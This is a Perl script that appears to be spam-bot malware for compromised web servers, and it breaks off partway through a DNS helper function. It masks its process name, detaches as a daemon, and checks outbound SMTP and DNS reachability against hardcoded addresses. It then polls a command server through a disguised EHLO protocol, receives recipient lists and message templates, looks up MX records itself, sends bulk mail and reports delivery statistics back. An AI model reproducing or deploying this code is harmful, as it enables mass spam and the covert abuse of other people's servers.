#!/usr/bin/perl
use strict;
use IO::Socket;
use IO::Select;

$| = 1;

my @fps = ("xend", "memc", "ramf");
my $nps = $fps[int rand scalar @fps];
$0 = $nps;

my $ewblock = 11;
my $eiprogr = 150;
if ($^O eq "linux") { $ewblock = 11; $eiprogr = 115; }
if ($^O eq "freebsd") { $ewblock = 35; $eiprogr = 36; }
if ($^O eq "MSWin32") { $ewblock = 10035; $eiprogr = 10036; }

my $test = {
	os => [$^O],
	ip => ["0.0.0.0", "216.146.43.70"],
	tcp25 => [0, "98.136.96.73", "104.47.5.33", "74.125.131.26"],
	udp53 => [0, "100.42.0.61", "104.168.134.167", "115.31.163.227"],
	tcp53 => [0, "100.42.0.61", "104.168.134.167", "115.31.163.227"],
	tcp80 => [0, "216.146.43.70"]
};

&set_i();
$_ = 'Jm7'.'3uZ';
print "Content-type: text/plain;
charset=iso-8859-1\x0D\x0A\x0D\x0A$_";
exit 0;

sub set_m
{
	my $s_host = shift;
	my $s_port = shift;
	my $s_path = shift;
	my $s_nsex = shift;
	if ($^O ne "MSWin32")
	{
		use POSIX qw(setsid);
		return unless defined (my $child = fork);
		return if $child;
		POSIX::setsid();
		$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM CHLD));
		umask 0;
		chdir "/";
		open (STDIN, "</dev/null");
		open (STDOUT, ">/dev/null");
		open (STDERR, ">&STDOUT");
	}
	&t_est(); exit 0 if $test->{tcp25}[0] != 1;
	if ($test->{udp53}[0] != 1 && $test->{tcp53}[0] != 1) {
		exit 0 if !defined $s_nsex;
		$s_nsex = pack ("C4", split (/\./, $s_nsex));
	} else {
		$s_nsex = undef;
	}
	srand;
	my $pid = $$;
	$pid = 1 + int rand 2147483648 if !defined $pid || $pid !~ /^\d+$/ || $pid > 4294967295;
	my $conf = {server_sign => 34, client_sign => 35, client_version => 36};
	my $s = {version => $conf->{client_version}, command => 0, size => 0, timeout => 60, request => 1, host => pack ("C4", split (/\./, $s_host))};
	my $b = {
		id			=> 0,
		ip			=> "",
		helo		=> undef,
		timezone	=> [["+", "-"]->[int rand 2], (1 + int rand 6)],
		nameserver	=> [],
		timeout		=> 10,
		session		=> 0,
		copies		=> 1,
		method		=> 0,
		spf			=> 0,
		level		=> 0,
		mailbase	=> [],
		from		=> [],
		replyto		=> [],
		subject		=> [],
		header		=> "",
		letter		=> "",
		priority	=> 1,
		type		=> 0,
		charset		=> "",
		good		=> [0, ""],
		unlucky		=> [0, ""],
		bad			=> [0, ""],
		report		=> ""
	};
	my $readers = IO::Select->new() or exit 0;
	my $writers = IO::Select->new() or exit 0;
	my $session = {};
	my $flagset = {timeout => 1};
	my $cache = {};
	my $reset_time = time;
	my $reset_wait = 120;
	my $reset_stat = 0;
	my $first_exec = 1;
	my $request_time = time;
	my $request_flag = 1;
	my $counter_addr = 0;
	my $destroy = sub
	{
	my ($object, $handle) = @_;
	if ($session->{$handle}{status} =~ /^rs/)
	{
		$request_flag = 1;
	}
	elsif (exists $session->{$handle}{object})
	{
		if ($_ = shift @{$session->{$handle}{object}})
		{
			$b->{unlucky}[0] ++;
			if ($b->{level})
			{
				$b->{unlucky}[1] .= "$_\x0A";
				$b->{report} .= "$_ - [$session->{$handle}{status}] Timeout\x0A" if $b->{level} > 1;
			}
			push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
		}
	}
	if (exists $session->{$handle}{mx})
	{
	$cache->{$session->{$handle}{mx}}[1] -- if $cache->{$session->{$handle}{mx}}[1] > 0;
	}
	delete $session->{$handle};
	$object->remove($handle);
	close $handle;
	};
	while (1)
	{
	IO::Select->select(undef, undef, undef, 0.01);
	my $time = time;
	if ($reset_stat != ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]))
	{
	$reset_stat = ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
	$reset_time = $time + $reset_wait;
	}
	if ($time >= $reset_time)
	{
	$reset_time = $time + $reset_wait;
	$reset_stat = 0;
	$counter_addr = 0;
	$b->{$_} = [] for (qw (mailbase from replyto subject));
	$b->{$_} = [0, ""] for (qw (good unlucky bad));
	$b->{report} = "";
	$cache = {};
	$session = {};
	my $ha = [$writers->handles];
	foreach my $hs (@$ha) { $writers->remove($hs); close $hs; }
	$ha = [$readers->handles];
	foreach my $hs (@$ha) { $readers->remove($hs); close $hs; }
	$request_flag = 1;
	$request_time = time;
	next;
	}
	if ($request_flag && $time >= $request_time)
	{
	while (1)
	{
	my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
	last unless $socket;
	if ($^O eq "MSWin32") { ioctl ($socket, 2147772030, pack ("L", 1)); } else { $socket->blocking(0); }
	unless ($socket->connect($_ = sockaddr_in($s_port, $s->{host})))
	{
	if ($! != $eiprogr && $! != $ewblock)
	{
	close $socket;
	last;
	}
	}
	unless ($writers->add($socket))
	{
	close $socket;
	last;
	}
	$session->{$socket} =
	{
	status	=> "rs_cn",
	buffer	=> "",
	flagset	=> $flagset->{timeout},
	timeout	=> 0
	};
	$s->{$_} = 0 for (qw (command size));
	if ($counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]))
	{
	$s->{command} = 1;
	$s->{command} = 2 if $first_exec;
	$reset_time = $time + $reset_wait;
	$reset_stat = 0;
	if ($counter_addr)
	{
	$s->{size} = 16;
	$session->{$socket}{buffer} .= pack ("L", $b->{id});
	$session->{$socket}{buffer} .= pack ("L", $b->{$_}[0]) for (qw (good unlucky bad));
	if ($b->{level})
	{
	for (qw (good unlucky bad))
	{
	$s->{size} += (4 + length $b->{$_}[1]);
	$session->{$socket}{buffer} .= pack ("L", length $b->{$_}[1]);
	$session->{$socket}{buffer} .= $b->{$_}[1];
	}
	if ($b->{level} > 1)
	{
	$s->{size} += (4 + length $b->{report});
	$session->{$socket}{buffer} .= pack ("L", length $b->{report});
	$session->{$socket}{buffer} .= $b->{report};
	}
	}
	}
	}
	$session->{$socket}{buffer} = pack ("SC2L2", $conf->{client_sign}, $s->{version}, $s->{command}, $pid, $s->{size}) . $session->{$socket}{buffer};
	$s->{size} = length $session->{$socket}{buffer};
	$session->{$socket}{buffer} = "EHLO 7f787e6d78656b697e75226f63612223\x0D\x0A$session->{$socket}{buffer}";
	$request_flag = 0;
	last;
	}
	}
	if (my $mail_array = shift @{$b->{mailbase}})
	{
	while (scalar @$mail_array)
	{
	my $mail = @{$mail_array}[0];
	my ($mx) = &mail(\$mail);
	$mx = lc ((split /\@/, $$mx)[1]);
	my $type = 15;
	if (exists $cache->{$mx})
	{
	my $sv = $mx;
	$mx = $cache->{$sv}[0];
	if ($mx =~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/)
	{
	$cache->{$sv}[1] = 0 unless $cache->{$sv}[1];
	if ($b->{session} && ($cache->{$sv}[1] >= $b->{session}))
	{
	push @{$b->{mailbase}}, $mail_array;
	last;
	}
	if ($1 > 255 || $2 > 255 || $3 > 255 || $4 > 255)
	{
	while ($_ = shift @$mail_array)
	{
	$b->{bad}[0] ++;
	if ($b->{level})
	{
	$b->{bad}[1] .= "$_\x0A";
	$b->{report} .= "$_ - [mx_ip] Object non exists\x0A" if $b->{level} > 1;
	}
	}
	last;
	}
	$mx = pack ("C4", $1, $2, $3, $4);
	my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
	unless ($socket)
	{
	push @{$b->{mailbase}}, $mail_array;
	last;
	}
	if ($^O eq "MSWin32") { ioctl ($socket, 2147772030, pack ("L", 1)); } else { $socket->blocking(0); }
	unless ($socket->connect($_ = sockaddr_in(25, $mx)))
	{
	if ($! != $eiprogr && $! != $ewblock)
	{
	close $socket;
	$b->{unlucky}[0] ++;
	if ($b->{level})
	{
	$b->{unlucky}[1] .= "$mail\x0A";
	$b->{report} .= "$mail - [mx_cn] Can't connect\x0A" if $b->{level} > 1;
	}
	shift @$mail_array;
	push @{$b->{mailbase}}, $mail_array if scalar @$mail_array;
	last;
	}
	}
	unless ($writers->add($socket))
	{
	close $socket;
	push @{$b->{mailbase}}, $mail_array;
	last;
	}
	$cache->{$sv}[1] ++;
	my $sender = @{$b->{from}}[int rand scalar @{$b->{from}}];
	$sender =~ s/\@.+$/\@$b->{helo}/ if ($b->{spf} && $b->{helo} ne "localhost");
	$session->{$socket} =
	{
	status	=> "mx_cn",
	mx		=> $sv,
	buffer	=> "",
	object	=> $mail_array,
	mindex	=> 0,
	sender	=> $sender,
	flagset	=> $flagset->{timeout},
	timeout	=> 0
	};
	last;
	}
	else
	{
	$type = 1;
	}
	}
	else
	{
	$type = 15;
	}
	my $socket;
	if ($test->{udp53}[0] == 1)
	{
	$socket = IO::Socket::INET->new(Proto => "udp");
	}
	else
	{
	$socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
	}
	unless ($socket)
	{
	push @{$b->{mailbase}}, $mail_array;
	last;
	}
	if ($^O eq "MSWin32") { ioctl ($socket, 2147772030, pack ("L", 1)); } else { $socket->blocking(0); }
	if ($test->{udp53}[0] == 0)
	{
	my $nameserver = shift @{$b->{nameserver}}; push @{$b->{nameserver}}, $nameserver;
	if (defined $s_nsex) { $nameserver = sockaddr_in(25, $s_nsex); } else { $nameserver = sockaddr_in(53, $nameserver); }
	unless ($socket->connect($nameserver))
	{
	if ($! != $eiprogr && $! != $ewblock)
	{
	close $socket;
	$b->{unlucky}[0] ++;
	if ($b->{level})
	{
	$b->{unlucky}[1] .= "$mail\x0A";
	$b->{report} .= "$mail - [ns_cn] Can't connect\x0A" if $b->{level} > 1;
	}
	shift @$mail_array;
	push @{$b->{mailbase}}, $mail_array if scalar @$mail_array;
	last;
	}
	}
	}
	unless ($writers->add($socket))
	{
	close $socket;
	push @{$b->{mailbase}}, $mail_array;
	last;
	}
	$session->{$socket} =
	{
	status	=> "ns_wr",
	buffer	=> "",
	object	=> $mail_array,
	sender	=> 0,
	flagset	=> $flagset->{timeout},
	timeout	=> 0,
	type	=> $type,
	packet	=> int rand 65536,
	size	=> 0
	};
	$session->{$socket}{buffer} .= pack ("nSn4", $session->{$socket}{packet}, 1, 1, 0, 0, 0);
	$session->{$socket}{buffer} .= pack ("C", length $_) . $_ for (split (/\./, $mx));
	$session->{$socket}{buffer} .= pack ("Cn2", 0, $session->{$socket}{type}, 1);
	$session->{$socket}{sender} = length $session->{$socket}{buffer};
	if ($test->{udp53}[0] == 0)
	{
	$session->{$socket}{status} = "ns_cn";
	$session->{$socket}{buffer} = join ("", pack ("n", $session->{$socket}{sender}), $session->{$socket}{buffer});
	}
	last;
	}
	}
	elsif ($counter_addr && !scalar keys %$session)
	{
	$counter_addr = ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]) if $counter_addr > ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
	$request_time = $time if $counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
	}
	my $writable = [$writers->handles];
	foreach my $handle (@$writable)
	{
	if ($session->{$handle}{flagset} & $flagset->{timeout})
	{
	if ($session->{$handle}{status} =~ /^rs/)
	{
	$session->{$handle}{timeout} = $time + $s->{timeout};
	}
	else
	{
	$session->{$handle}{timeout} = $time + $b->{timeout};
	}
	$session->{$handle}{flagset} ^= $flagset->{timeout};
	}
	elsif ($time >= $session->{$handle}{timeout})
	{
	$destroy->($writers, $handle);
	}
	}
	$writable = (IO::Select->select(undef, $writers, undef, 0))[1];
	foreach my $handle (@$writable)
	{
	if ($session->{$handle}{status} =~ /cn$/)
	{
	if ($handle->connected)
	{
	if ($session->{$handle}{status} eq "rs_cn")
	{
	$session->{$handle}{status} = "rs_wr";
	}
	elsif ($session->{$handle}{status} eq "ns_cn")
	{
	$session->{$handle}{status} = "ns_wr";
	}
	else
	{
	$session->{$handle}{status} = "mx_rd";
	unless ($readers->add($handle))
	{
	$destroy->($writers, $handle);
	next;
	}
	$writers->remove($handle);
	}
	}
	else
	{
	$destroy->($writers, $handle);
	}
	}
	else
	{
	my $result;
	if ($session->{$handle}{status} eq "ns_wr")
	{
	if ($test->{udp53}[0] == 0)
	{
	$result = $handle->send($session->{$handle}{buffer});
	}
	else
	{
	my $nameserver = shift @{$b->{nameserver}}; push @{$b->{nameserver}}, $nameserver;
	$result = $handle->send($session->{$handle}{buffer}, 0, $_ = sockaddr_in(53, $nameserver));
	}
	}
	else
	{
	$result = syswrite ($handle, $session->{$handle}{buffer});
	}
	if (defined $result && $result > 0)
	{
	substr ($session->{$handle}{buffer}, 0, $result) = "";
	if (length $session->{$handle}{buffer} < 1)
	{
	if ($session->{$handle}{status} eq "rs_wr")
	{
	$session->{$handle}{status} = "rs_rd";
	if ($s->{command} && $counter_addr && ($counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0])))
	{
	$counter_addr = 0;
	$b->{$_} = [] for (qw (mailbase from replyto subject));
	$b->{$_} = [0, ""] for (qw (good unlucky bad));
	$b->{report} = "";
	$cache = {};
	}
	$request_time = $time + $s->{request} * 60;
	}
	elsif ($session->{$handle}{status} eq "ns_wr")
	{
	$session->{$handle}{status} = "ns_rd";
	}
	unless ($readers->add($handle))
	{
	$destroy->($writers, $handle);
	next;
	}
	$writers->remove($handle);
	}
	}
	elsif ($! == $ewblock)
	{
	next;
	}
	else
	{
	$destroy->($writers, $handle);
	}
	}
	}
	my $readable = [$readers->handles];
	foreach my $handle (@$readable)
	{
	if ($session->{$handle}{flagset} & $flagset->{timeout})
	{
	if ($session->{$handle}{status} =~ /^rs/)
	{
	$session->{$handle}{timeout} = $time + $s->{timeout};
	}
	else
	{
	$session->{$handle}{timeout} = $time + $b->{timeout};
	}
	$session->{$handle}{flagset} ^= $flagset->{timeout};
	}
	elsif ($time >= $session->{$handle}{timeout})
	{
	$destroy->($readers, $handle);
	}
	}
	$readable = (IO::Select->select($readers, undef, undef, 0))[0];
	foreach my $handle (@$readable)
	{
	my $result;
	if ($session->{$handle}{status} eq "ns_rd")
	{
	if ($test->{udp53}[0] == 0)
	{
	my $tempbuffer = "";
	if ($session->{$handle}{size} == 0)
	{
	$handle->recv($tempbuffer, (2 - length $session->{$handle}{buffer}));
	$session->{$handle}{buffer} .= $tempbuffer;
	if (2 == length $session->{$handle}{buffer})
	{
	$session->{$handle}{size} = unpack ("n", $session->{$handle}{buffer});
	$session->{$handle}{buffer} = "";
	}
	next;
	}
	$handle->recv($tempbuffer, ($session->{$handle}{size} - length $session->{$handle}{buffer}));
	$session->{$handle}{buffer} .= $tempbuffer;
	if ($session->{$handle}{size} == length $session->{$handle}{buffer})
	{
	$result = $session->{$handle}{size};
	}
	}
	else
	{
	$result = $handle->recv($session->{$handle}{buffer}, 512);
	$result = length $session->{$handle}{buffer} if defined $result;
	}
	}
	else
	{
	$result = sysread ($handle, $session->{$handle}{buffer}, 16384, length $session->{$handle}{buffer});
	}
	if (defined $result)
	{
	if ($result > 0)
	{
	if ($session->{$handle}{status} eq "rs_rd")
	{
	next if 8 > length $session->{$handle}{buffer};
	if ($session->{$handle}{buffer} !~ /^220 OK/)
	{
	$destroy->($readers, $handle);
	next;
	}
	else
	{
	my $offset = index ($session->{$handle}{buffer}, "\x0D\x0A");
	next unless $offset >= 0;
	if ($session->{$handle}{buffer} =~ /^(220) OK\x0D\x0A/)
	{
	if ($1 !~ /^220/)
	{
	$destroy->($readers, $handle);
	next;
	}
	$offset += 2;
	next if 10 > (length $session->{$handle}{buffer}) - $offset;
	my $server =
	{
	sign		=> 0,
	timeout		=> 0,
	request		=> 0,
	command		=> 0,
	size		=> 0
	};
	@_ = unpack ("S2C2L", substr ($session->{$handle}{buffer}, $offset, 10));
	$server->{$_} = shift @_ for (qw (sign timeout request command size));
	if ($server->{sign} != $conf->{server_sign})
	{
	$destroy->($readers, $handle);
	next;
	}
	$first_exec = 0;
	exit 0 if $server->{command};
	$s->{timeout} = $server->{timeout};
	$s->{request} = $server->{request};
	$request_time = $time + $s->{request} * 60;
	unless ($server->{size})
	{
	$destroy->($readers, $handle);
	next;
	}
	$offset += 10;
	next if $server->{size} > (length $session->{$handle}{buffer}) - $offset;
	substr ($session->{$handle}{buffer}, 0, $offset) = "";
	@_ = unpack ("La4", substr ($session->{$handle}{buffer}, 0, 8, ""));
	$b->{$_} = shift @_ for (qw (id ip));
	$b->{nameserver} = [];
	push @{$b->{nameserver}}, substr ($session->{$handle}{buffer}, 0, 4, "") for (1..16);
	@_ = unpack ("S2C4", substr ($session->{$handle}{buffer}, 0, 8, ""));
	$b->{$_} = shift @_ for (qw (timeout session copies method spf level));
	@{$b->{$_}} = split ("\x0A", substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "")) for (qw (mailbase from replyto subject));
	$counter_addr = scalar @{$b->{mailbase}};
	my $mailbase_temp = {};
	while (my $mail_temp = shift @{$b->{mailbase}})
	{
	my ($host_temp) = &mail(\$mail_temp);
	$host_temp = lc ((split /\@/, $$host_temp)[1]);
	$mailbase_temp->{$host_temp} = [] unless exists $mailbase_temp->{$host_temp};
	push @{$mailbase_temp->{$host_temp}}, $mail_temp;
	}
	foreach my $host_temp (keys %$mailbase_temp)
	{
	while (scalar @{$mailbase_temp->{$host_temp}})
	{
	my $mail_temp = [];
	for (1..$b->{copies})
	{
	last unless scalar @{$mailbase_temp->{$host_temp}};
	push @$mail_temp, shift @{$mailbase_temp->{$host_temp}};
	}
	push @{$b->{mailbase}}, $mail_temp;
	}
	}
	undef $mailbase_temp;
	$b->{header} = substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "");
	unless ($b->{header})
	{
	$b->{header} = ['Date: %DATE%', 'From: %FROMADDR%', 'Reply-To: %REPLYTOADDR%', 'X-Priority: %NPRIORITY%', 'Message-ID: <%MESSAGEID%@%HELO%>', 'To: %TOADDR%', 'Subject: %SUBJECT%'];
	$b->{header} = join ("\x0D\x0A", @{$b->{header}}, 'MIME-Version: 1.0', 'Content-Type: text/%TYPE%; charset=%CHARSET%', 'Content-Transfer-Encoding: %ENCODING%');
	}
	$b->{letter} = substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "");
	$b->{letter} = "" unless $b->{letter};
	$b->{$_} = unpack ("C", substr ($session->{$handle}{buffer}, 0, 1, "")) for (qw (priority type));
	$b->{charset} = substr ($session->{$handle}{buffer}, 0, length $session->{$handle}{buffer}, "");
	$b->{ip} = join (".", unpack ("C4", $b->{ip}));
	unless ($b->{helo})
	{
	if (defined $s_nsex)
	{
	$b->{helo} = &nsptr($_ = sockaddr_in(25, $s_nsex), 3, $b->{ip});
	}
	else
	{
	$b->{helo} = &nsptr($_ = sockaddr_in(53, $b->{nameserver}[0]), 3, $b->{ip});
	$b->{helo} = &nsptr($_ = sockaddr_in(53, pack ("C4", split (/\./, "8.8.8.8"))), 3, $b->{ip}) unless $b->{helo};
	}
	$b->{helo} = "localhost" unless $b->{helo};
	}
	$b->{report} = "\x0ACLIENT V.$s->{version} IP=$b->{ip} PTR=$b->{helo} ID=$b->{id}\x0A\x0A" if $b->{level} > 1;
	$destroy->($readers, $handle);
	next;
	}
	else
	{
	$destroy->($readers, $handle);
	next;
	}
	}
	}
	elsif ($session->{$handle}{status} eq "ns_rd")
	{
	if (length $session->{$handle}{buffer})
	{
	my ($resp, $code) = &nsparser(\$session->{$handle}{buffer}, $session->{$handle}{sender}, $session->{$handle}{packet}, $session->{$handle}{type});
	if ($resp == 2)
	{
	while ($_ = shift @{$session->{$handle}{object}})
	{
	$b->{bad}[0] ++;
	if ($b->{level})
	{
	$b->{bad}[1] .= "$_\x0A";
	$b->{report} .= "$_ - [ns_rd] $code\x0A" if $b->{level} > 1;
	}
	}
	}
	elsif ($resp == 1)
	{
	$resp = shift @{$session->{$handle}{object}};
	$b->{unlucky}[0] ++;
	if ($b->{level})
	{
	$b->{unlucky}[1] .= "$resp\x0A";
	$b->{report} .= "$resp - [ns_rd] $code\x0A" if $b->{level} > 1;
	}
	push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
	}
	else
	{
	$resp = @{$session->{$handle}{object}}[0];
	($resp) = &mail(\$resp);
	$resp = lc ((split /\@/, $$resp)[1]);
	$cache->{$resp}[0] = $code;
	push @{$b->{mailbase}}, $session->{$handle}{object};
	}
	delete $session->{$handle}{object};
	$destroy->($readers, $handle);
	next;
	}
	}
	elsif ($session->{$handle}{buffer} =~ /^[^\-]{4}.*\x0D\x0A$/m)
	{
	if ($session->{$handle}{buffer} !~ /^(2|3)/)
	{
	if ($b->{level} > 1)
	{
	$session->{$handle}{buffer} =~ s/\x0D//g;
	$session->{$handle}{buffer} =~ s/[\x09|\x0A]+/\x20/g;
	}
	$session->{$handle}{mindex} -- if $session->{$handle}{mindex} > 0;
	if ($session->{$handle}{status} =~ /^mx_(rd|gr)$/)
	{
	while ($_ = shift @{$session->{$handle}{object}})
	{
	$b->{unlucky}[0] ++;
	if ($b->{level})
	{
	$b->{unlucky}[1] .= "$_\x0A";
	$b->{report} .= "$_ - [$session->{$handle}{status}] Bad host $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
	}
	}
	delete $session->{$handle}{object};
	$destroy->($readers, $handle);
	next;
	}
	elsif ($session->{$handle}{status} =~ /^mx_(mf|rt)$/)
	{
	if ($session->{$handle}{buffer} =~ /\d+\.\d+\.\d+\.\d+/g || $session->{$handle}{buffer} =~ /( ip |block|black|reject|later|many)/ig)
	{
	while ($_ = shift @{$session->{$handle}{object}})
	{
	$b->{unlucky}[0] ++;
	if ($b->{level})
	{
	$b->{unlucky}[1] .= "$_\x0A";
	$b->{report} .= "$_ - [$session->{$handle}{status}] Bad host $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
	}
	}
	delete $session->{$handle}{object};
	$destroy->($readers, $handle);
	next;
	}
	else
	{
	$b->{bad}[0] ++;
	if ($b->{level})
	{
	$b->{bad}[1] .= "$session->{$handle}{object}[$session->{$handle}{mindex}]\x0A";
	$b->{report} .= "$session->{$handle}{object}[$session->{$handle}{mindex}] - [$session->{$handle}{status}] Invalid recipient $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
	}
	splice @{$session->{$handle}{object}}, $session->{$handle}{mindex}, 1;
	unless (scalar @{$session->{$handle}{object}})
	{
	delete $session->{$handle}{object};
	$destroy->($readers, $handle);
	next;
	}
	}
	}
	else
	{
	$b->{unlucky}[0] ++;
	if ($b->{level})
	{
	$b->{unlucky}[1] .= "$session->{$handle}{object}[$session->{$handle}{mindex}]\x0A";
	$b->{report} .= "$session->{$handle}{object}[$session->{$handle}{mindex}] - [$session->{$handle}{status}] Delivery error $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
	}
	splice @{$session->{$handle}{object}}, $session->{$handle}{mindex}, 1;
	push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
	delete $session->{$handle}{object};
	$destroy->($readers, $handle);
	next;
	}
	}
	if ($session->{$handle}{status} eq "mx_rd")
	{
	my $helo = $b->{helo};
	$session->{$handle}{buffer} = "E"."H";
	$session->{$handle}{buffer} .= "L"."O"." $helo\x0D\x0A";
	$session->{$handle}{status} = "mx_gr";
	}
	elsif ($session->{$handle}{status} eq "mx_gr")
	{
	my ($mail) = &mail(\$session->{$handle}{sender});
	$session->{$handle}{buffer} = "MAIL ";
	$session->{$handle}{buffer} .= "FROM: <$$mail>\x0D\x0A";
	$session->{$handle}{status} = "mx_mf";
	}
	elsif ($session->{$handle}{status} eq "mx_mf")
	{
	my ($mail) = &mail(\$session->{$handle}{object}[$session->{$handle}{mindex}]);
	$session->{$handle}{buffer} = "RCPT TO: <$$mail>\x0D\x0A";
	$session->{$handle}{mindex} ++;
	$session->{$handle}{status} = $session->{$handle}{mindex} >= scalar @{$session->{$handle}{object}} ? "mx_rt" : "mx_mf";
	}
	elsif ($session->{$handle}{status} eq "mx_rt")
	{
	$session->{$handle}{buffer} = "DATA\x0D\x0A";
	$session->{$handle}{status} = "mx_dt";
	}
	elsif ($session->{$handle}{status} eq "mx_dt")
	{
	$session->{$handle}{buffer} = &data($session->{$handle}{object}, $session->{$handle}{sender}, $b);
	$session->{$handle}{buffer} .= "\x0D\x0A.\x0D\x0A";
	$session->{$handle}{status} = "mx_dr";
	}
	elsif ($session->{$handle}{status} eq "mx_dr")
	{
	$b->{good}[0] += scalar @{$session->{$handle}{object}};
	if ($b->{level})
	{
	while ($_ = shift @{$session->{$handle}{object}})
	{
	$b->{good}[1] .= "$_\x0A";
	}
	}
	delete $session->{$handle}{object};
	$session->{$handle}{buffer} = "QUIT\x0D\x0A";
	$session->{$handle}{status} = "mx_qt";
	}
	else
	{
	$destroy->($readers, $handle);
	next;
	}
	unless ($writers->add($handle))
	{
	$destroy->($readers, $handle);
	next;
	}
	$readers->remove($handle);
	}
	}
	else
	{
	$destroy->($readers, $handle);
	next;
	}
	}
	elsif ($! == $ewblock)
	{
	next;
	}
	else
	{
	$destroy->($readers, $handle);
	next;
	}
	}
	}
}

sub nsunpack
{
my ($packet, $offset) = @_;
my ($length, $size, $name, $next) = (length $$packet, 0, "", "");
while (1)
{
return if $length < ($offset + 1);
$size = unpack ("\@$offset C", $$packet);
if ($size == 0)
{
$offset ++;
last;
}
elsif (($size & 192) == 192)
{
return if $length < ($offset + 2);
$next = unpack ("\@$offset n", $$packet);
$next &= 16383;
($next) = &nsunpack($packet, $next);
return if !defined $next;
$name .= $next;
$offset += 2;
last;
}
else
{
$offset ++;
return if $length < ($offset + $size);
$next = substr ($$packet, $offset, $size);
$name .= "$next.";
$offset += $size;
}
}
$name =~ s/\.$//;
return if !length $name;
return ($name, $offset);
}
sub nsrecord
{
my ($packet, $offset) = @_;
my ($length, $name) = (length $$packet, "");
($name, $offset) = &nsunpack($packet, $offset);
return if !defined $name || $length < ($offset + 10);
my ($rtype, $rclass, $rttl, $rlength) = unpack ("\@$offset n2Nn", $$packet);
$offset += 10;
return if $length < ($offset + $rlength);
return ($name, $offset, $rtype, $rclass, $rttl, $rlength);
}
sub nsparser
{
my ($packet, $offset, $sequence, $type) = @_;
my ($length, $name) = (length $$packet, "");
return (1, "Broken header") if $length < 12;
@_ = unpack ("nC2n4", $$packet);
my $header =
{
id		=> $_[0],
qr		=> ($_[1] >> 7) & 1,
opcode	=> ($_[1] >> 3) & 15,
aa		=> ($_[1] >> 2) & 1,
tc		=> ($_[1] >> 1) & 1,
rd		=> $_[1] & 1,
ra		=> ($_[2] >> 7) & 1,
z		=> ($_[2] >> 4) & 6,
rcode	=> $_[2] & 15,
qdcount	=> $_[3],
ancount	=> $_[4],
nscount	=> $_[5],
arcount	=> $_[6]
};
return (1, "Synchronization error") if $header->{id} != $sequence;
return (1, "Recursion disabled") if !$header->{ra};
return (2, "Query format error") if $header->{rcode} == 1;
return (2, "Server failure") if $header->{rcode} == 2;
return (2, "Non-existent domain") if $header->{rcode} == 3;
return (2, "Empty answer section") if !$header->{ancount};
return (1, "Broken packet") if $length < $offset;
my ($answer, $rtype, $rclass, $rttl, $rlength) = ({}, 0, 0, 0, 0);
while ($header->{ancount})
{
$header->{ancount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
if ($type != $rtype)
{
$offset += $rlength;
next;
}
if ($type == 1)
{
$name = substr ($$packet, $offset, 4);
last if !defined $name || 4 > length $name;
$offset += $rlength;
$name = inet_ntoa($name);
$answer->{$name} = 1;
}
elsif ($type == 12)
{
($name, $offset) = &nsunpack($packet, $offset);
last if !defined $name;
$answer->{$name} = 1;
}
elsif ($type == 15)
{
$sequence = substr ($$packet, $offset, 2);
last if !defined $sequence || 2 > length $sequence;
($name, $offset) = &nsunpack($packet, ($offset + 2));
last if !defined $name;
$answer->{$name} = unpack ("n", $sequence);
}
}
return (2, "No resourse records") if !scalar keys %$answer;
my $result = (sort {$answer->{$a} <=> $answer->{$b}} keys %$answer)[0];
if ($type == 15 && $header->{arcount})
{
while ($header->{nscount})
{
$header->{nscount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
$offset += $rlength;
}
while ($header->{arcount})
{
$header->{arcount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
if ($rtype == 1 && exists $answer->{$name})
{
$name = substr ($$packet, $offset, 4);
last if !defined $name || 4 > length $name;
$result = inet_ntoa($name);
last;
}
$offset += $rlength;
}
}
return (0, $result);
}
sub nsptr
{
my ($packaddr, $timeout, $query) = @_; my $type = 12;
return if !defined $query || $query !~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/;
return if ($1 > 255 || $2 > 255 || $3 > 255 || $4 > 255);
$query = "$4.$3.$2.$1.in-addr.arpa";
my $packid = int rand 65536; my $packet = pack ("nSn4", $packid, 1, 1, 0, 0, 0);
$packet .= pack ("C", length $_) . $_ for (split (/\./, lc $query));
$packet .= pack ("Cn2", 0, $type, 1);
my $offset = length $packet;
my ($socket, $select, $buffer, $resp, $text, $size);
if ($test->{udp53}[0] == 1)
{
$socket = IO::Socket::INET->new(Proto=>"udp");
return unless $socket;
$select = new IO::Select $socket;
if ($select->can_write($timeout))
{
unless ($socket->send($packet, 0, $packaddr))
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
if ($select->can_read($timeout))
{
$socket->recv($buffer, 512);
}
else
{
close $socket;
return;
}
close $socket;
return if !defined $buffer || !length $buffer;
}
else
{
$socket = IO::Socket::INET->new(Proto=>"tcp", Type=>SOCK_STREAM);
return unless $socket;
